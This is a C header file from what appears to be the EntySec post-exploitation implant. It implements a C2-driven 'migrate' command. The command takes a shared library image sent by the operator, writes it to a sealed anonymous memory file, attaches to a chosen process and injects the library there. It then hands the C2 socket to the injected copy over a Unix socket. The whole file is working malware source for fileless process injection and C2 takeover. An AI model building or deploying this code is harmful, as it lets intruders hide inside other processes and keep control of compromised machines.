/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _MIGRATE_H_
#define _MIGRATE_H_

#include <sigar.h>
#include <limits.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <fcntl.h>

#include <syscall.h>
#include <injector.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>

#include <api.h>
#include <c2.h>
#include <core.h>
#include <tlv_types.h>
#include <tlv.h>
#include <log.h>

#include <net_client.h>
#include <net_server.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC       0x0001U
#define MFD_ALLOW_SEALING 0x0002U
#endif

#define PROC_PATH "/proc/"
#define MEMFD_PATH PROC_PATH "%d/fd/%d"

#define MIGRATE_CLONE 1
#define MIGRATE_BASE 5

#define MIGRATE_LOAD \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       PROCESS_BASE, \
                       API_CALL)

#define PROCESS_PIPE \
        TLV_PIPE_CUSTOM(PIPE_STATIC, \
                        PROCESS_BASE, \
                        PIPE_TYPE)

struct eio_migrate_req
{
    c2_t *c2;
    net_server_t *server;
};

static int migrate_inject_library(pid_t pid, int length,
                                  unsigned char *image, int flags)
{
    ssize_t count;
    size_t done;

    int fd;
    char path[PATH_MAX];

    injector_t *injector;

    done = 0;

    fd = syscall(SYS_memfd_create, NULL, MFD_CLOEXEC | MFD_ALLOW_SEALING);
    if (fd < 0)
    {
        log_debug("* Unable to create memory file descriptor\n");
        return -1;
    }

    if (ftruncate(fd, length) < 0)
    {
        log_debug("* Unable to write object to file (%d)\n", fd);
        return -1;
    }

    log_debug("* Writing object to file (%d)\n", fd);

    while (done < length)
    {
        if ((count = write(fd, image + done, length - done)) < 0)
        {
            return -1;
        }

        done += count;
    }

    fcntl(fd, F_ADD_SEALS, F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE);
    sprintf(path, MEMFD_PATH, getpid(), fd);

    if (injector_attach(&injector, pid) < 0)
    {
        log_debug("Failed to attach to (%d) - (%s)\n", pid, injector_error());
        return -1;
    }

    log_debug("* Attached to the process (%d)\n", pid);

#ifdef INJECTOR_HAS_INJECT_IN_CLONED_THREAD
    if (flags & MIGRATE_CLONE)
    {
        if (injector_inject_in_cloned_thread(injector, path, NULL) < 0)
        {
            goto fail;
        }

        goto finalize;
    }
#endif

if (injector_inject(injector, path, NULL) < 0)
{
    goto fail;
}

finalize:
    log_debug("* Injected to the process (%d)\n", pid);
    injector_detach(injector);

    return 0;

fail:
    log_debug("* Failed to inject (%s)\n", injector_error());
    injector_detach(injector);
}

static void migrate_load_library(struct eio_req *request)
{
    int length;
    int flags;

    unsigned char *image;
    struct eio_migrate_req *req;

    c2_t *c2;
    pid_t pid;

    req = request->data;
    c2 = req->c2;

    tlv_pkt_get_u32(c2->request, TLV_TYPE_PID, &pid);
    tlv_pkt_get_u32(c2->request, TLV_TYPE_INT, &flags);

    if ((length = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &image)) > 0)
    {
        if (migrate_inject_library(pid, length, image, flags) == 0)
        {
            free(image);

            c2->response = api_craft_tlv_pkt(API_CALL_QUIT, c2->request);
            goto finalize;
        }

        free(image);
    }

    c2->response = api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

finalize:
    c2_enqueue_tlv(c2, c2->response);

    tlv_pkt_destroy(c2->request);
    tlv_pkt_destroy(c2->response);

    net_server_stop(req->server);
    net_server_free(req->server);
}

static void process_migrate_accept(int event, void *data)
{
    net_t *net;
    net_t *c2_net;

    int sock;
    char buf[sizeof(int)];

    struct iovec iov;
    struct msghdr msg;
    struct cmsghdr *pcmsghdr;

    char buffer[CMSG_SPACE(sizeof(int))];

    if (event != NET_SERVER_CLIENT)
    {
        return;
    }

    net = data;
    c2_net = net->link_data;
    sock = c2_net->io->pipe[0];

    log_debug("* Sending file (%d)\n", sock);

    memset(buf, 0, sizeof(int));
    iov.iov_base = (void*)buf;
    iov.iov_len = sizeof(int);
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = buffer;
    msg.msg_controllen = sizeof(buffer);
    msg.msg_flags = 0;

    pcmsghdr = CMSG_FIRSTHDR(&msg);
    pcmsghdr->cmsg_len = CMSG_LEN(sizeof(int));
    pcmsghdr->cmsg_level = SOL_SOCKET;
    pcmsghdr->cmsg_type = SCM_RIGHTS;

    *((int*)CMSG_DATA(pcmsghdr)) = sock;
    sendmsg(net->io->pipe[0], &msg, 0);

    net_free(net);
}

static tlv_pkt_t *migrate_load(c2_t *c2)
{
    struct eio_migrate_req table;

    table.c2 = c2;
    table.server = net_server_create();

    if (table.server == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    net_server_setup(table.server, c2->loop);
    net_server_set_links(table.server, NULL, NULL,
                         process_migrate_accept, c2);
    net_server_start(table.server, NET_PROTO_UNIX, "#IPCSocket", 0);

    eio_custom(migrate_load_library, 0, NULL, &table);
    return NULL;
}

void register_migrate_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, MIGRATE_LOAD, migrate_load);
}

#endif
